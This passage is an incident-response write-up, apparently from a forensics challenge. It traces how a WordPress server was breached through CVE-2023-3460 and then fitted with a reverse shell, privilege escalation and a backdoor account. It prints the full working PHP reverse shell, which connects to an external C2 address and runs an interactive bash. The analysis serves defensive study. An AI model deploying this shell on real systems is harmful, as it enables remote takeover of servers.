</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">76</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>package<span style="color:#ff79c6">-</span>verify<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">104466</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>packages<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1126</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>df<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">54667</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dmesg<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>key<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4990</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">38</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>host<span style="color:#ff79c6">-</span>date<span style="color:#ff79c6">-</span>timezone<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1863</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsusb<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1391</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>meminfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">112329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>modinfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">5151</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>module<span style="color:#ff79c6">-</span>sha1<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4348</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>mount<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>procmod<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">526</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>release<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">4570</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>sudo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User_Files:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">8</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">5</span> root root <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">315</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> hidden<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>home<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Virsh:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span></code></pre></div><h3 id="tools">Tools</h3>
<ul>
<li>Visual Studio Code</li>
<li>Sublime Text Editor</li>
<li><a href="https://github.com/WithSecureLabs/LinuxCatScale">LinuxCatScale</a> to extract the archive.</li>
</ul>
<h3 id="analysis">Analysis</h3>
<p>The web server was <code>Apache v2.4.41-4ubuntu3.14</code> and it was running <code>WordPress v6.2.2</code> on <code>Ubuntu 20.04.6 LTS (Focal Fossa)</code> with a kernel version of <code>5.15.0-1036-aws</code>.</p>
<p>The server was triaged and we were provided artifacts following the <code>acquisition playbook</code>. Because this was an attack on the webserver most of the analysis for <strong>Initial Foothold</strong> will revolve around analyzing the <code>access.log</code>.</p>
<p>From the access log, we see a lot of HTTP requests coming in and out of the server from an IP <code>23.106.60.163</code> with the user agent <code>WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)</code>. The TA used this IP to scan Forella&rsquo;s WordPress blog for vulnerabilities.</p>
<p><code>WPScanner</code> is an automated security auditing tool for WordPress. It scans the WordPress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.</p>
<p>The log shows that the TA was successful in identifying a vulnerable plugin. It was <a href="https://ultimatemember.com/">Ultimate-Member - User Profile, Registration, Login, Member Directory, Content Restriction &amp; Membership Plugin</a>, the version that was installed on Forella&rsquo;s WordPress site was <code>v2.6.4</code>.</p>
<p>According to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460">Mitre</a> - <em>The Ultimate Member WordPress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild.</em> The CVE assigned was <code>CVE-2023-3460</code> with a CVSS (v3.x) base score of <code>9.8 CRITICAL</code>. The exploit for this CVE was publicly available at the time of the attack.</p>
<p>After identifying the vulnerability, the TA used a <a href="https://github.com/gbrsh/CVE-2023-3460">PoC published on GitHub</a> by a security research firm named <a href="https://secragon.com/">Secragon</a>. It was confirmed by analyzing the script&rsquo;s User Agents which were <code>python-requests/2.28.1</code> and <code>Secragon Offensive Agen</code>.</p>
<p>Therefore, successfully creating an admin user named <code>secragon</code> the TA switched his IP to <code>198.16.74.45</code> and manually browsed the admin dashboard. We can confirm this by their User Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</code>.</p>
<p>To get a foothold on the server the TA created a malicious theme, which served as a reverse shell to perform Remote Command Execution. They created the file here <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The code for the reverse shell is below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span style="display:flex;"><span>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set_time_limit (0);
</span></span><span style="display:flex;"><span>$VERSION = &#34;1.0&#34;;
</span></span><span style="display:flex;"><span>$ip = &#39;43.204.24.76&#39;;
</span></span><span style="display:flex;"><span>$port = 6969;
</span></span><span style="display:flex;"><span>$chunk_size = 1400;
</span></span><span style="display:flex;"><span>$write_a = null;
</span></span><span style="display:flex;"><span>$error_a = null;
</span></span><span style="display:flex;"><span>$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;
</span></span><span style="display:flex;"><span>$daemon = 0;
</span></span><span style="display:flex;"><span>$debug = 0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (function_exists(&#39;pcntl_fork&#39;)) {
</span></span><span style="display:flex;"><span>	$pid = pcntl_fork();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Can&#39;t fork&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	if ($pid) {
</span></span><span style="display:flex;"><span>		exit(0);  // Parent exits
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	if (posix_setsid() == -1) {
</span></span><span style="display:flex;"><span>		printit(&#34;Error: Can&#39;t setsid()&#34;);
</span></span><span style="display:flex;"><span>		exit(1);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$daemon = 1;
</span></span><span style="display:flex;"><span>} else {
</span></span><span style="display:flex;"><span>	printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chdir(&#34;/&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>umask(0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Open reverse connection
</span></span><span style="display:flex;"><span>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
</span></span><span style="display:flex;"><span>if (!$sock) {
</span></span><span style="display:flex;"><span>	printit(&#34;$errstr ($errno)&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$descriptorspec = array(
</span></span><span style="display:flex;"><span>   0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
</span></span><span style="display:flex;"><span>   1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
</span></span><span style="display:flex;"><span>   2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)   // stderr is a pipe that the child will write to
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$process = proc_open($shell, $descriptorspec, $pipes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>if (!is_resource($process)) {
</span></span><span style="display:flex;"><span>	printit(&#34;ERROR: Can&#39;t spawn shell&#34;);
</span></span><span style="display:flex;"><span>	exit(1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[0], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[1], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($pipes[2], 0);
</span></span><span style="display:flex;"><span>stream_set_blocking($sock, 0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>while (1) {
</span></span><span style="display:flex;"><span>	if (feof($sock)) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell connection terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (feof($pipes[1])) {
</span></span><span style="display:flex;"><span>		printit(&#34;ERROR: Shell process terminated&#34;);
</span></span><span style="display:flex;"><span>		break;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$read_a = array($sock, $pipes[1], $pipes[2]);
</span></span><span style="display:flex;"><span>	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($sock, $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($sock, $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;SOCK: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($pipes[0], $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[1], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[1], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDOUT: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	if (in_array($pipes[2], $read_a)) {
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR READ&#34;);
</span></span><span style="display:flex;"><span>		$input = fread($pipes[2], $chunk_size);
</span></span><span style="display:flex;"><span>		if ($debug) printit(&#34;STDERR: $input&#34;);
</span></span><span style="display:flex;"><span>		fwrite($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fclose($sock);
</span></span><span style="display:flex;"><span>fclose($pipes[0]);
</span></span><span style="display:flex;"><span>fclose($pipes[1]);
</span></span><span style="display:flex;"><span>fclose($pipes[2]);
</span></span><span style="display:flex;"><span>proc_close($process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>function printit ($string) {
</span></span><span style="display:flex;"><span>	if (!$daemon) {
</span></span><span style="display:flex;"><span>		print &#34;$string\n&#34;;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>?&gt;
</span></span></code></pre></div><p>From this code we can see the C2 server <code>43.204.24.76:6969</code> and the command <code>uname -a; w; id; /bin/bash -i</code> the web shell executed on behalf of the TA. First, the web shell created a process with PID <code>234471</code> to execute the shell&rsquo;s payload. Then for <code>/bin/bash -i</code> command it created an interactive bash shell with the PID <code>234517</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>www-data  234517  234471   2616   596 ?        S    09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i
</span></span><span style="display:flex;"><span>www-data  234521  234517   4248  3444 ?        S    09:01 00:00:00 /bin/bash -i
</span></span></code></pre></div><p>To elevate the shell&rsquo;s privilege the attacker used a bash script <code>LinEnum.sh</code> to enumerate potential privilege escalation vectors. The TA uploaded <code>LinEnum.sh</code> to <code>/tmp</code> and then <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>7,1,/dev/shm/LinEnum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631
</span></span></code></pre></div><p>And they were successful in gaining root access. From the <code>auth.log</code> we see that the TA logged into SSH using <code>ubuntu</code> user&rsquo;s private SSH key using another IP <code>203.101.190.9</code>. Then escalate their privilege to <code>root</code> using su.</p>
<p>Immediately after that, the threat actor created an account <code>cyberjunkie_admin</code> for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: Accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: RSA SHA256:c/25gw2HCe4yy/6f4eAd5O1dvdGebtUFKOEVAh7kmzk
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:25 ip-172-31-11-131 systemd-logind[523]: New session 1971 of user ubuntu.
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/su
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0)
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Received SIGHUP; restarting.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on 0.0.0.0 port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:53:08 ip-172-31-11-131 sshd[126847]: Server listening on :: port 22.
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, GID=1001
</span></span><span style="display:flex;"><span>Aug  7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, UID=1001, GID=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin
</span></span><span style="display:flex;"><span>Aug  7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user &#39;cyberjunkie_admin&#39; information
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0
</span></span><span style="display:flex;"><span>Aug  7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0)
</span></span></code></pre></div><p>Closely examining the sudoers permission file we found a <code>very risky configuration</code> that allowed the <code>ubuntu</code> user to perform tasks as <code>root</code> without authentication.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on Wed, 12 Jul 2023 11:41:45 +0000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># User rules for ubuntu
</span></span><span style="display:flex;"><span>ubuntu ALL=(ALL) NOPASSWD:ALL
</span></span></code></pre></div><h2 id="timeline">Timeline</h2>
<ul>
<li>
<p><strong>Reconnaissance:</strong> On <code>2023-08-08 08:21:27</code> the TA started the scanner using IP <code>23.106.60.163</code>.</p>
</li>
<li>
<p><strong>Weaponization &amp; Delivery:</strong> On <code>2023-08-08 08:32:50</code> The TA identified the vulnerable WordPress plugin <code>Ultimate Member v2.6.4</code>.</p>
</li>
<li>
<p><strong>Exploitation:</strong> On <code>2023-08-08 08:33:58</code> the TA successfully exploited CVE-2023-3460 and added an Admin user <code>secragon</code>.</p>
</li>
<li>
<p><strong>Installation:</strong> On <code>2023-08-08 08:58:02</code> the TA created a reverse web shell <code>/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php</code>. The TA did this from an IP <code>198.16.74.45</code>. After that, on <code>2023-08-08 09:06:53</code> the TA uploaded a Bash Script <code>LinEnum.sh</code> inside the <code>/tmp</code> folder then he moved it to the <code>/dev/shm</code> on <code>2023-08-08 09:32:38</code>.</p>
</li>
<li>
<p><strong>Command and Control:</strong> The TA used IP <code>43.204.24.76</code> and port <code>6969</code> as a C2 server.</p>
</li>
</ul>
<h2 id="remarks">Remarks</h2>
<p>Analyzing the log file indicates that the server was already compromised on <code>2023-08-07 13:50:25</code> by another threat actor who logged into the SSH account of <code>ubuntu</code> user from IP <code>203.101.190.9</code> using SSH key and created a backdoor admin account <code>cyberjunkie_admin</code> on <code>2023-08-07 13:55:36</code>. The account seems to be dormant but that TA (<code>203.101.190.9</code>) also compromised the MySQL Database.</p>
